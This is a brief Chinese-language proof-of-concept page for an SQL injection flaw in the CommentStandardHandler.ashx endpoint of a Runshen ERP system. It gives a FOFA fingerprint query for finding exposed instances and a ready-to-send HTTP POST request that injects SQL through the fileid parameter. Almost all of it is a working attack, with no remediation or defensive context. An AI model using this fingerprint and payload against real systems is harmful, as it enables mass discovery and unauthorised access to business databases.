# 润申信息科技ERP系统CommentStandardHandler.ashx接口存在sql注入漏洞



## fofa

```yaml
body="PDCA/js/_publicCom.js"
```

## poc

```java

POST /PDCA/ashx/CommentStandardHandler.ashx HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36

action=detailInfo&fileid=1+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123')),3,32))<0--
```

